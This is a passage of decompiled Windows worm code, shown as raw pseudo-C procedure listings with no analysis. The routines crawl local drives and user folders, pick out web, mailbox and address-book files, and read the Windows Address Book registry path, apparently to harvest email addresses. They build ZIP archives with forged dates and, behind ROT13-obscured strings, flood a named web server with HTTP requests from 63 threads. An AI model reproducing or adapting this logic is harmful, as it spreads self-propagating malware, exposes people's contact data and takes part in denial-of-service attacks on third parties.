    004a6848: ebx = 0x4a2a28;
    004a684d: do {
        004a6857: memset( & Vfffffdf8, 0, esi);
        004a6869: (save)esi;
        004a686a: (save) & Vfffffdf8;
        004a686b: if(Vfffffffc != 0) {
            004a6875: (save)"USERPROFILE";
            004a687a: eax = *__imp__GetEnvironmentVariableA();
        } else {
            004a686d: eax = *__imp__GetWindowsDirectoryA();
        }
        004a6887: if(Vfffffdf8 != 0) {
            004a688f: (save) & Vfffffdf8;
            004a689e: if(*(ebp + *__imp__lstrlenA() + -521) != 92) {
                004a68a6: (save)ebx;
                004a68a7: (save) & Vfffffdf8;
                004a68a8: *edi();
            }
            004a68ae: if(Vfffffffc == 1) {
                004a68b3: (save) & Vffffffbc;
                004a68ba: (save) & Vfffffdf8;
                004a68bb: *edi();
                004a68c3: (save)ebx;
                004a68c4: (save) & Vfffffdf8;
                004a68c5: *edi();
            }
            004a68cd: (save) & Vffffff7c;
            004a68d4: (save) & Vfffffdf8;
            004a68d5: *edi();
            004a68e0: eax = L004A68F9( & Vfffffdf8, 5);
        }
        004a68e7: Vfffffffc = Vfffffffc + 1;
    } while(Vfffffffc < 2);
}

/*	Procedure: 0x004A68F9 - 0x004A6A9E
 *	Argument size: 8
 *	Local size: 604
 *	Save regs size: 8
 */

L004A68F9(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vfffffda4;
	/* unknown */ void  Vfffffdd0;
	/* unknown */ void  Vfffffdd1;
	/* unknown */ void  Vfffffdd2;
	/* unknown */ void  Vfffffee4;
	/* unknown */ void  Vfffffffc;



    004a6904: edi = 0;
    004a6909: if(Ac > 0) {
        004a690f: esi = A8;
        004a6914: if(esi == 0 || *esi == 0) {
            ff1003f7: goto L004a6a98;
        }
        004a6923: while(*L004A8D10 != edi) {
            004a692b: (save)2048;
            004a6930: *__imp__Sleep();
        }
        004a6938: edi = __imp__lstrcpyA;
        004a693e: (save)ebx;
        004a6945: (save)esi;
        004a6946: (save) & Vfffffee4;
        004a6947: *__imp__lstrcpyA();
        004a6949: ebx = __imp__lstrlenA;
        004a6955: (save) & Vfffffee4;
        004a6960: esi = __imp__lstrcatA;
        004a6966: if(*(ebp + *__imp__lstrlenA() + -285) != 92) {
            004a696e: (save)0x4a2a28;
            004a6973: (save) & Vfffffee4;
            004a6974: *__imp__lstrcatA();
        }
        004a697c: (save)"*.*";
        004a6981: (save) & Vfffffee4;
        004a6982: *esi();
        004a6992: memset( & Vfffffda4, 0, 320);
        004a699a: Vfffffffc = 0;
        004a699e: while(1) {
            004a69a8: (save) & Vfffffda4;
            004a69a9: if(Vfffffffc != 0) {
                004a69d0: (save)Vfffffffc;
                004a69db: if(*__imp__FindNextFileA() == 0) {
                    ff100405: break;
                } else {
                    ff100406: goto L004a69e1;
                }
            }
            004a69b1: (save) & Vfffffee4;
            004a69b2: eax = *__imp__FindFirstFileA();
            004a69bb: Vfffffffc = eax;
            004a69be: if(eax == -1) {
                004a69c0: Vfffffffc = 0;
            }
            004a69c8: if(Vfffffffc == 0) {
                ff100403: goto L004a6a93;
            }
004a69e1: L004a69e1:
            004a69e8: if(Vfffffdd0 == 46 && (Vfffffdd1 == 0 || Vfffffdd1 == 46 && Vfffffdd2 == 0)) {
                ff100409: continue;
            }
            004a6a05: (save)A8;
            004a6a0e: (save) & Vfffffee4;
            004a6a0f: *edi();
            004a6a17: (save) & Vfffffee4;
            004a6a22: if(*(ebp + *ebx() + -285) != 92) {
                004a6a2a: (save)0x4a2a28;
                004a6a2f: (save) & Vfffffee4;
                004a6a30: *esi();
            }
            004a6a38: (save) & Vfffffdd0;
            004a6a3f: (save) & Vfffffee4;
            004a6a40: *esi();
            004a6a4d: if((Vfffffda4 & 16) != 16) {
                004a6a75: (save) & Vfffffda4;
                004a6a7c: (save) & Vfffffee4;
                004a6a7d: L004A6A9F();
            } else {
                004a6a4f: (save)75;
                004a6a51: *__imp__Sleep();
                004a6a63: L004A68F9( & Vfffffee4, Ac - 1);
            }
        }
        004a6a88: if(Vfffffffc != 0) {
            004a6a8d: *__imp__FindClose(Vfffffffc);
        }
004a6a93: L004a6a93:
        004a6a93: eax = 0;
        004a6a95: (restore)ebx;
    } else {
004a6a98: L004a6a98:
        004a6a9a: eax = 1;
    }
}

/*	Procedure: 0x004A6A9F - 0x004A6C68
 *	Argument size: 8
 *	Local size: 20
 *	Save regs size: 8
 */

L004A6A9F(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  Vffffffec;
	/* unknown */ void  Vfffffffc;



    004a6aa7: esi = Ac;
    004a6aaa: (save)edi;
    004a6aaf: if(*(esi + 32) >= 40) {
        004a6ab7: ecx = ecx | -1;
        004a6abd: if(*(esi + 44) != 0) {
            004a6abf: do {
                004a6ac4: if(eax >= 255) {
                    ff100419: break;
                }
                004a6acb: if(*(esi + eax + 44) == 46) {
                    004a6acd: ecx = eax;
                }
                004a6acf: eax = eax + 1;
            } while(*(esi + eax + 44) != 0);
            004a6ad9: if(ecx >= 0) {
                ff10041f: goto L004a6ae1;
            }
        }
        004a6adb: Vffffffec = 0;
        004a6adf: goto L004a6afc;
004a6ae1: L004a6ae1:
        004a6ae5: (save)15;
        004a6ae7: (save)ecx + esi + 45;
        004a6aeb: (save) & Vffffffec;
        004a6aec: *__imp__lstrcpynA();
        004a6af5: (save) & Vffffffec;
        004a6af6: *__imp__CharLowerA();
004a6afc: L004a6afc:
        004a6afc: Vfffffffc = 0;
        004a6b04: Ac = 204800;
        004a6b0b: if(Vffffffec == 0 && *(esi + 32) > 20480) {
            ff100423: goto L004a6c27;
        }
        004a6b1a: edi = __imp__lstrcmpA;
        004a6b23: (save)"txt";
        004a6b28: (save) & Vffffffec;
        004a6b29: Vfffffffc = 1;
        004a6b34: if(*__imp__lstrcmpA() == 0) {
            004a6b36: Ac = 81920;
            004a6b3d: goto L004a6c27;
        }
        004a6b42: (save)3;
        004a6b47: (restore)ebx;
        004a6b59: if(L004A498D( & Vffffffec, "htmb", ebx) == 0 || L004A498D( & Vffffffec, "shtl", ebx) == 0 || L004A498D( & Vffffffec, "phpq", ebx) == 0 || L004A498D( & Vffffffec, "aspd", ebx) == 0 || L004A498D( & Vffffffec, "dbxn", ebx) == 0) {
            ff100427: goto L004a6c27;
        }
        004a6bd3: if(L004A498D( & Vffffffec, "tbbg", ebx) == 0) {
            004a6bd5: Ac = 1228800;
            004a6bdc: goto L004a6c27;
        }
        004a6bf2: if(L004A498D( & Vffffffec, "adbh", ebx) == 0) {
            ff100433: goto L004a6c27;
        }
        004a6bf7: (save)"pl";
        004a6bfc: (save) & Vffffffec;
        004a6c01: if(*edi() == 0) {
            ff100435: goto L004a6c27;
        }
        004a6c0d: Vfffffffc = 2;
        004a6c14: eax = L004A498D( & Vffffffec, "wab", ebx);
        004a6c1e: if(eax == 0) {
            004a6c20: Ac = 8388608;
004a6c27: L004a6c27:
            004a6c27: eax = Ac;
            004a6c2d: if(*(esi + 32) <= eax) {
                004a6c2f: while(*L004A8D10 != 0) {
                    004a6c38: (save)2048;
                    004a6c3d: eax = *__imp__Sleep();
                }
                004a6c49: if(Vfffffffc == 1) {
                    004a6c4e: eax = L004A6647(A8);
                    004a6c53: goto L004a6c63;
                }
                004a6c59: if(Vfffffffc == 2) {
                    004a6c5e: eax = L004A6C69(A8);
004a6c63: L004a6c63:
                }
            }
        }
    }
    004a6c64: (restore)edi;
}

/*	Procedure: 0x004A6C69 - 0x004A6D78
 *	Argument size: 4
 *	Local size: 144
 *	Save regs size: 8
 */

L004A6C69(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  Vffffff70;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    004a6c73: ebx = 0;
    004a6c76: (save)0;
    004a6c77: (save)128;
    004a6c7c: (save)3;
    004a6c7e: (save)0;
    004a6c7f: (save)3;
    004a6c81: (save)-2147483648;
    004a6c86: (save)A8;
    004a6c8f: esi = *__imp__CreateFileA();
    004a6c93: Vfffffff4 = esi;
    004a6c96: if(esi != ebx && esi != -1) {
        004a6ca5: (save)ebx;
        004a6ca6: (save)esi;
        004a6cad: (save)ebx;
        004a6cae: (save)ebx;
        004a6caf: (save)ebx;
        004a6cb0: (save)2;
        004a6cb2: (save)ebx;
        004a6cb3: (save)esi;
        004a6cb4: Vfffffff0 = *__imp__GetFileSize();
        004a6cb7: eax = *__imp__CreateFileMappingA();
        004a6cbf: Vfffffff8 = eax;
        004a6cc2: if(eax != ebx && eax != -1) {
            004a6cd1: (save)edi;
            004a6cd2: (save)ebx;
            004a6cd3: (save)ebx;
            004a6cd4: (save)ebx;
            004a6cd5: (save)4;
            004a6cd7: (save)eax;
            004a6cde: edi = *__imp__MapViewOfFile();
            004a6ce2: if(edi == ebx) {
                004a6ce6: ebx = 3;
            } else {
                004a6ce9: eax = *(edi + 100);
                004a6cec: ecx = *(edi + 96);
                004a6cf1: if(eax > ebx) {
                    004a6cf3: A8 = ecx;
                    004a6cf6: Vfffffffc = eax;
                    004a6cf9: do {
                        004a6cf9: esi = A8;
                        004a6d09: memset( & Vffffff70, ebx, 128);
                        004a6d0e: ecx = Vfffffff0;
                        004a6d14: eax = 0;
                        004a6d18: if(esi < ecx) {
                            004a6d1a: do {
                                004a6d1d: if(eax >= 68) {
                                    ff10044f: break;
                                }
                                004a6d22: *(ebp + eax + -144) = *(esi + edi);
                                004a6d2c: if(*(esi + edi) == bl) {
                                    ff100451: break;
                                }
                                004a6d2e: eax = eax + 1;
                                004a6d30: esi = esi + 1 + 1;
                            } while(esi < ecx);
                            004a6d37: if(eax > ebx) {
                                004a6d40: L004A6639( & Vffffff70);
                            }
                        }
                        004a6d46: A8 = A8 + 68;
                    } while(Vfffffffc = Vfffffffc - 1);
                }
                004a6d4f: (save)edi;
                004a6d50: *__imp__UnmapViewOfFile();
            }
            004a6d56: (save)Vfffffff8;
            004a6d59: *__imp__CloseHandle();
            004a6d5f: (restore)edi;
004a6d60: L004a6d60:
            004a6d63: *__imp__CloseHandle(Vfffffff4);
            004a6d69: eax = ebx;
            004a6d6b: goto L004a6d75;
        }
        004a6d6f: ebx = 2;
        004a6d70: goto L004a6d60;
    }
    004a6d74: eax = 1;
004a6d75: L004a6d75:
}

/*	Procedure: 0x004A6D79 - 0x004A6E24
 *	Argument size: 0
 *	Local size: 260
 *	Save regs size: 8
 */

L004A6D79()
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  Vfffffefc;
	/* unknown */ void  Vfffffefd;



    004a6d84: esi = 260;
    004a6d93: memset( & Vfffffefc, 0, 260);
    004a6da1: (save)esi;
    004a6da2: (save) & Vfffffefc;
    004a6da3: *__imp__GetSystemDirectoryA();
    004a6da9: bl = Vfffffefc;
    004a6db5: (save)":\";
    004a6dba: (save) & Vfffffefd;
    004a6dbb: *__imp__lstrcpyA();
    004a6dc7: (save)15;
    004a6dca: eax = L004A68F9( & Vfffffefc);
    004a6dd0: Vfffffefc = 67;
    004a6dd7: (restore)ecx;
    004a6dd8: do {
        004a6dde: if(Vfffffefc != bl) {
            004a6de6: (save) & Vfffffefc;
            004a6de7: eax = *__imp__GetDriveTypeA();
            004a6df0: if(eax == 3) {
                ff10045b: goto L004a6df7;
            }
            004a6df5: if(eax == 6) {
004a6df7: L004a6df7:
                004a6df7: (save)8096;
                004a6dfc: *__imp__Sleep();
                004a6e0b: eax = L004A68F9( & Vfffffefc, 15);
            }
        }
        004a6e12: Vfffffefc = Vfffffefc + 1;
    } while(Vfffffefc < 90);
}

/*	Procedure: 0x004A6E25 - 0x004A6E2F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004A6E25()
{



    004a6e25: *L004A8D10 = 0;
}

/*	Procedure: 0x004A6E30 - 0x004A6E39
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L004A6E30(A4)
/* unknown */ void  A4;
{



    004a6e34: *L004A8D10 = A4;
    004a6e39: return(*L004A8D10);
}

/*	Procedure: 0x004A6E3A - 0x004A6E64
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004A6E3A()
{



    004a6e3a: L004A6E65();
    004a6e3f: (save)-1;
    004a6e47: (save) *__imp__GetCurrentThread();
    004a6e48: *__imp__SetThreadPriority();
    004a6e4e: for(L004A680B(); 1; *__imp__Sleep()) {
        004a6e53: L004A6D79();
        004a6e58: (save)32768;
    }
    004a6e54: goto L004a6e54;
}

/*	Procedure: 0x004A6E65 - 0x004A6EF1
 *	Argument size: 0
 *	Local size: 344
 *	Save regs size: 4
 */

L004A6E65()
{
	/* unknown */ void  ebx;
	/* unknown */ void  Vfffffea8;
	/* unknown */ void  Vffffffa8;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    004a6e72: (save)"Fbsgjner\Zvpebfbsg\JNO\JNO4\Jno Svyr Anzr";
    004a6e78: L004A471C( & Vffffffa8);
    004a6e81: (restore)ecx;
    004a6e82: ebx = 0;
    004a6e84: (save) & Vfffffffc;
    004a6e85: (save)131097;
    004a6e8d: (save)0;
    004a6e8e: (save) & Vffffffa8;
    004a6e8f: (save)-2147483647;
    004a6e94: eax = *__imp__RegOpenKeyExA();
    004a6e9c: if(eax == 0) {
        004a6eab: memset( & Vfffffea8, ebx, 256);
        004a6eb6: Vfffffff8 = 256;
        004a6ebd: (save) & Vfffffff8;
        004a6ec4: (save) & Vfffffea8;
        004a6ec5: (save)ebx;
        004a6ec6: (save)ebx;
        004a6ec7: (save)ebx;
        004a6ec8: (save)Vfffffffc;
        004a6ecb: *__imp__RegQueryValueExA();
        004a6ed1: (save)Vfffffffc;
        004a6ed4: eax = *__imp__RegCloseKey();
        004a6ee0: if(Vfffffea8 != bl) {
            004a6ee9: eax = L004A6C69( & Vfffffea8);
        }
    }
}

/*	Procedure: 0x004A6EF2 - 0x004A700D
 *	Argument size: 12
 *	Local size: 0
 *	Save regs size: 0
 */

L004A6EF2(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{



    004a6ef5: edx = Ac;
    004a6efa: if(edx == 0) {
        004a6eff: return(0);
    }
    004a6f03: (save)ebx;
    004a6f04: (save)esi;
    004a6f05: esi = A10;
    004a6f0b: (save)edi;
    004a6f0c: eax = !A8;
    004a6f0e: ecx = 255;
    004a6f13: if(esi >= 8) {
        004a6f1b: edi = esi >> 3;
        004a6f25: A10 = esi + ~edi * 8;
        004a6f28: do {
            004a6f28: ebx = *edx & 255;
            004a6f2f: esi = eax & ecx ^ ebx;
            004a6f33: ebx = eax >> 8;
            004a6f3d: eax = *(esi * 4 + 0x4a3450) ^ ebx;
            004a6f3f: edx = edx + 1;
            004a6f40: esi = eax;
            004a6f42: ebx = *edx & 255;
            004a6f47: esi = esi & ecx ^ ebx;
            004a6f49: ebx = *(edx + 1) & 255;
            004a6f4d: esi = *(esi * 4 + 0x4a3450);
            004a6f57: esi = esi ^ eax >> 8;
            004a6f59: edx = edx + 1;
            004a6f5e: eax = esi & ecx ^ ebx;
            004a6f60: ebx = *(edx + 1) & 255;
            004a6f64: eax = *(eax * 4 + 0x4a3450);
            004a6f6e: eax = eax ^ esi >> 8;
            004a6f70: edx = edx + 1;
            004a6f75: esi = eax & ecx ^ ebx;
            004a6f77: ebx = *(edx + 1) & 255;
            004a6f7b: esi = *(esi * 4 + 0x4a3450);
            004a6f85: esi = esi ^ eax >> 8;
            004a6f87: edx = edx + 1;
            004a6f8c: eax = esi & ecx ^ ebx;
            004a6f8e: ebx = *(edx + 1) & 255;
            004a6f92: eax = *(eax * 4 + 0x4a3450);
            004a6f9c: eax = eax ^ esi >> 8;
            004a6f9e: edx = edx + 1;
            004a6fa3: esi = eax & ecx ^ ebx;
            004a6fa5: ebx = *(edx + 1) & 255;
            004a6fa9: esi = *(esi * 4 + 0x4a3450);
            004a6fb3: esi = esi ^ eax >> 8;
            004a6fb5: edx = edx + 1;
            004a6fba: eax = esi & ecx ^ ebx;
            004a6fbc: ebx = *(edx + 1) & 255;
            004a6fc0: eax = *(eax * 4 + 0x4a3450);
            004a6fca: eax = eax ^ esi >> 8;
            004a6fcc: edx = edx + 1;
            004a6fd1: esi = eax & ecx ^ ebx;
            004a6fd3: eax = eax >> 8;
            004a6fdd: eax = eax ^ *(esi * 4 + 0x4a3450);
            004a6fdf: edx = edx + 1;
        } while(edi = edi - 1);
        004a6fe7: esi = A10;
    }
    004a6fec: if(esi != 0) {
        004a6fee: do {
            004a6fee: ebx = *edx & 255;
            004a6ff5: edi = eax & ecx ^ ebx;
            004a6ff7: eax = eax >> 8;
            004a7001: eax = eax ^ *(edi * 4 + 0x4a3450);
            004a7003: edx = edx + 1;
        } while(esi = esi - 1);
    }
    004a7007: (restore)edi;
    004a7008: (restore)esi;
    004a7009: eax = !eax;
    004a700b: (restore)ebx;
}

/*	Procedure: 0x004A700E - 0x004A7248
 *	Argument size: 12
 *	Local size: 1140
 *	Save regs size: 12
 */

L004A700E(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vfffffb8c;
	/* unknown */ void  Vffffff8c;
	/* unknown */ void  Vffffff90;
	/* unknown */ void  Vffffff94;
	/* unknown */ void  Vffffff96;
	/* unknown */ void  Vffffff98;
	/* unknown */ void  Vffffff9a;
	/* unknown */ void  Vffffff9c;
	/* unknown */ void  Vffffff9e;
	/* unknown */ void  Vffffffa0;
	/* unknown */ void  Vffffffa4;
	/* unknown */ void  Vffffffa8;
	/* unknown */ void  Vffffffac;
	/* unknown */ void  Vffffffae;
	/* unknown */ void  Vffffffb4;
	/* unknown */ void  Vffffffb6;
	/* unknown */ void  Vffffffba;
	/* unknown */ void  Vffffffc0;
	/* unknown */ void  Vffffffc4;
	/* unknown */ void  Vffffffc6;
	/* unknown */ void  Vffffffc8;
	/* unknown */ void  Vffffffca;
	/* unknown */ void  Vffffffcc;
	/* unknown */ void  Vffffffce;
	/* unknown */ void  Vffffffd2;
	/* unknown */ void  Vffffffd6;
	/* unknown */ void  Vffffffda;
	/* unknown */ void  Vffffffdc;
	/* unknown */ void  Vffffffe0;
	/* unknown */ void  Vffffffe4;
	/* unknown */ void  Vffffffe6;
	/* unknown */ void  Vffffffe8;
	/* unknown */ void  Vffffffea;
	/* unknown */ void  Vffffffec;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    004a701a: esi = 0;
    004a701c: edi = 128;
    004a7021: (save)0;
    004a7022: ebx = __imp__CreateFileA;
    004a7028: (save)128;
    004a7029: (save)3;
    004a702b: (save)0;
    004a702c: (save)3;
    004a702e: (save)-2147483648;
    004a7033: (save)A8;
    004a7036: eax = *__imp__CreateFileA();
    004a703b: Vfffffffc = eax;
    004a703e: if(eax != -1 && eax != esi) {
        004a704c: (save)esi;
        004a704d: (save)edi;
        004a704e: (save)2;
        004a7050: (save)esi;
        004a7051: (save)3;
        004a7053: (save)1073741824;
        004a7058: (save)Ac;
        004a705d: edi = *ebx();
        004a7062: Ac = edi;
        004a7065: if(edi != -1 && edi != esi) {
            004a7073: (save)30;
            004a7078: (save)esi;
            004a7079: (save) & Vffffffc0;
            004a707a: memset();
            004a707f: (save)46;
            004a7084: (save)esi;
            004a7085: (save) & Vffffff90;
            004a7086: memset();
            004a708b: (save)22;
            004a7090: (save)esi;
            004a7091: (save) & Vffffffe0;
            004a7092: memset();
            004a709a: Vffffffc0 = 67324752;
            004a70a1: (save) & Vffffffcc;
            004a70a5: (save) & Vffffffca;
            004a70a6: Vffffffc4 = 10;
            004a70ac: Vffffff96 = 10;
            004a70b2: Vffffffc6 = si;
            004a70b6: Vffffff98 = si;
            004a70ba: Vffffffc8 = si;
            004a70be: Vffffff9a = si;
            004a70c2: L004A7249();
            004a70cb: (save)Vfffffffc;
            004a70ce: Vffffff9c = Vffffffca;
            004a70d6: Vffffff9e = Vffffffcc;
            004a70da: eax = L004A72CE();
            004a70e5: esp = esp + 48;
            004a70e8: Vffffffce = eax;
            004a70eb: Vffffffa0 = Vffffffce;
            004a70ee: (save)esi;
            004a70ef: (save)Vfffffffc;
            004a70f2: eax = *__imp__GetFileSize();
            004a70f4: (save)esi;
            004a70f5: Vffffffd2 = eax;
            004a70f8: (save)Vfffffffc;
            004a70fb: Vffffffa4 = Vffffffd2;
            004a70fe: eax = *__imp__GetFileSize();
            004a7100: (save)A10;
            004a7103: ebx = __imp__lstrlenA;
            004a7109: Vffffffd6 = eax;
            004a710c: Vffffffa8 = Vffffffd6;
            004a710f: *__imp__lstrlenA();
            004a7111: Vffffffda = ax;
            004a7115: Vffffffac = ax;
            004a711c: (save)esi;
            004a711d: (save) & A8;
            004a7121: (save)30;
            004a7123: (save) & Vffffffc0;
            004a7124: (save)edi;
            004a7125: edi = __imp__WriteFile;
            004a712b: Vffffffdc = si;
            004a712f: Vffffffae = si;
            004a7133: Vffffffba = esi;
            004a7136: *__imp__WriteFile();
            004a713b: (save)esi;
            004a713c: (save) & A8;
            004a713d: (save)A10;
            004a7142: (save) *ebx();
            004a7143: (save)A10;
            004a7146: (save)Ac;
            004a7149: *edi();
            004a714b: (save)A10;
            004a7150: (save)esi;
            004a7151: (save)esi;
            004a7155: (save)esi;
            004a7156: (save)Vfffffffc;
            004a7159: Vfffffff8 = *ebx() + 30;
            004a715c: for(*__imp__SetFilePointer(); 1; Vfffffff8 = Vfffffff8 + A8) {
                004a7165: (save)esi;
                004a7166: (save) & A8;
                004a716d: (save)1024;
                004a7172: (save) & Vfffffb8c;
                004a7173: (save)Vfffffffc;
                004a7176: A8 = esi;
                004a7181: if(*__imp__ReadFile() == 0 || A8 == esi) {
                    ff100477: break;
                }
                004a718b: (save)esi;
                004a718c: (save) & Vffffff8c;
                004a7193: (save)A8;
                004a7196: (save) & Vfffffb8c;
                004a7197: (save)Ac;
                004a719a: *edi();
            }
            004a71a7: (save)esi;
            004a71a8: Vfffffff0 = Vfffffff8;
            004a71ae: (save) & A8;
            004a71b2: (save)46;
            004a71b4: (save) & Vffffff90;
            004a71b5: (save)Ac;
            004a71b8: Vffffff90 = 33639248;
            004a71bf: Vffffff94 = 20;
            004a71c5: Vffffffb4 = si;
            004a71c9: Vffffffb6 = 32;
            004a71d0: *edi();
            004a71d5: (save)esi;
            004a71d6: (save) & A8;
            004a71d7: (save)A10;
            004a71dc: (save) *ebx();
            004a71dd: (save)A10;
            004a71e0: (save)Ac;
            004a71e3: *edi();
            004a71e5: (save)A10;
            004a71e8: eax = *ebx();
            004a71ed: (save)esi;
            004a71ee: Vffffffe0 = 101010256;
            004a71f5: Vffffffe4 = si;
            004a71fd: Vffffffe6 = si;
            004a7204: Vffffffe8 = 1;
            004a720a: Vffffffea = 1;
            004a7210: Vfffffff4 = si;
            004a7214: Vffffffec = Vfffffff8 + eax + 46 - Vfffffff0;
            004a721a: (save) & A8;
            004a721e: (save)22;
            004a7220: (save) & Vffffffe0;
            004a7221: (save)Ac;
            004a7224: *edi();
            004a7226: (save)Ac;
            004a7229: *__imp__CloseHandle();
004a722f: L004a722f:
            004a7232: *__imp__CloseHandle(Vfffffffc);
            004a7238: eax = esi;
            004a723a: goto L004a7244;
        }
        004a723e: esi = 2;
        004a723f: goto L004a722f;
    }
    004a7243: eax = 1;
004a7244: L004a7244:
}

/*	Procedure: 0x004A7249 - 0x004A72CD
 *	Argument size: -8
 *	Local size: 16
 *	Save regs size: 0
 */

L004A7249(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff2;
	/* unknown */ void  Vfffffff6;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffa;
	/* unknown */ void  Vfffffffc;



    004a7253: *__imp__GetSystemTime( & Vfffffff0);
    004a725f: if(Vfffffff0 < 1999 || Vfffffff0 > 2010) {
        004a7269: Vfffffff0 = 2004;
    }
    004a7274: if(Vfffffff2 < 1 || Vfffffff2 > 12) {
        004a727d: Vfffffff2 = 1;
    }
    004a7288: if(Vfffffff6 < 1 || Vfffffff6 > 31) {
        004a7291: Vfffffff6 = 10;
    }
    004a72ab: eax = Vfffffff0 + 68 << 9 | Vfffffff2 << 5 | Vfffffff6;
    004a72ae: *Ac = ax;
    004a72c9: *A8 = (Vfffffff8 << 6 | Vfffffffa) << 5 | Vfffffffc >> 1;
    004a72cd: return(*A8);
}

/*	Procedure: 0x004A72CE - 0x004A7354
 *	Argument size: 4
 *	Local size: 1032
 *	Save regs size: 12
 */

L004A72CE(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vfffffbf8;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    004a72d9: esi = 0;
    004a72dc: (save)0;
    004a72dd: (save)0;
    004a72de: (save)0;
    004a72df: (save)A8;
    004a72e2: *__imp__SetFilePointer();
    004a72e8: edi = __imp__ReadFile;
    004a72f1: (save)esi;
    004a72f2: (save) & Vfffffffc;
    004a72f3: ebx = 1024;
    004a72fe: (save)1024;
    004a72ff: (save) & Vfffffbf8;
    004a7300: (save)A8;
    004a7303: Vfffffff8 = esi;
    004a7306: for(Vfffffffc = esi; *edi() != 0 && Vfffffffc != esi; (save)A8) {
        004a7329: Vfffffff8 = L004A6EF2(Vfffffff8, & Vfffffbf8, Vfffffffc);
        004a732f: Vfffffffc = esi;
        004a7332: (save)esi;
        004a7333: (save) & Vfffffffc;
        004a733a: (save)ebx;
        004a733b: (save) & Vfffffbf8;
    }
    004a7347: *__imp__SetFilePointer(A8, esi, esi, esi);
    004a7354: return(Vfffffff8);
}

/*	Procedure: 0x004A7355 - 0x004A73F7
 *	Argument size: 0
 *	Local size: 148
 *	Save regs size: 12
 */

L004A7355()
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vffffff6c;
	/* unknown */ void  Vffffffec;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff2;
	/* unknown */ void  Vfffffff4;



    004a736d: L004A471C( & Vffffff6c, "jjj.fpb.pbz");
    004a7372: edi = __imp__Sleep;
    004a737a: for(ebx = 32768; 1; *edi()) {
        004a7386: if(L004A4CEE() != 0) {
            004a738e: (save) & Vffffff6c;
            004a7395: esi = *L004a1178();
            004a7399: if(esi != 0) {
                ff10048d: break;
            }
        }
        004a739b: (save)ebx;
    }
    004a73a8: memset( & Vfffffff0, 0, 16);
    004a73ad: Vfffffff0 = 2;
    004a73bb: (save)80;
    004a73bf: Vfffffff4 = *( *( *(esi + 12)));
    004a73c2: *L004a114c();
    004a73c8: (save)63;
    004a73ca: Vfffffff2 = Vfffffff4;
    004a73ce: (restore)esi;
    004a73cf: do {
        004a73d5: (save) & Vffffffec;
        004a73d8: (save)0;
        004a73d9: (save) & Vfffffff0;
        004a73da: (save)0x4a73f8;
        004a73df: (save)0;
        004a73e0: (save)0;
        004a73e1: *__imp__CreateThread();
    } while(esi = esi - 1);
    004a73f7: return(L004A73F8( & Vfffffff0));
}

/*	Procedure: 0x004A73F8 - 0x004A7480
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004A73F8()
{



    004a73f8: (save)ebp;
    004a73f9: ebp = esp;
    004a73fb: esp = esp - 528;
    004a7401: (save)esi;
    004a740e: L004A471C(ebp + -528, "TRG / UGGC/1.1\r\nUbfg: jjj.fpb.pbz\r\n\r\n");
    004a7415: (save)-1;
    004a741d: (save) *__imp__GetCurrentThread();
    004a741e: *__imp__SetThreadPriority();
    004a7424: esi = *(ebp + 8);
    004a7429: if(esi == 0) {
        004a742b: (save)esi;
        004a742c: *__imp__ExitThread();
        004a7432: (restore)esi;
    }
    004a7433: (save)edi;
    004a7434: edi = ebp - 16;
    004a7437: *edi = *esi;
    004a7437: edi = edi + 4;
    004a7437: esi = esi + 4;
    004a7438: *edi = *esi;
    004a7438: edi = edi + 4;
    004a7438: esi = esi + 4;
    004a7439: *edi = *esi;
    004a7439: edi = edi + 4;
    004a7439: esi = esi + 4;
    004a743a: *edi = *esi;
    004a743a: edi = edi + 4;
    004a743a: esi = esi + 4;
    004a743b: for((restore)edi; 1; *L004a115c()) {
        004a743f: (save)8;
        004a7447: esi = L004A7481(ebp - 16);
        004a744c: (restore)ecx;
        004a744d: if(esi == 0) {
            ff100493: continue;
        }
        004a7455: (save)0;
        004a7457: (save)ebp + -528;
        004a745e: (save) *__imp__lstrlenA();
        004a7465: (save)ebp + -528;
        004a7466: (save)esi;
        004a7467: *L004a1168();
        004a746d: (save)300;
        004a7472: *__imp__Sleep();
        004a7478: (save)esi;
    }
    004a743d: goto L004a743d;
}

/*	Procedure: 0x004A7481 - 0x004A759D
 *	Argument size: 8
 *	Local size: 532
 *	Save regs size: 12
 */

L004A7481(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vfffffdec;
	/* unknown */ void  Vfffffdf0;
	/* unknown */ void  Vfffffef0;
	/* unknown */ void  Vfffffef4;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
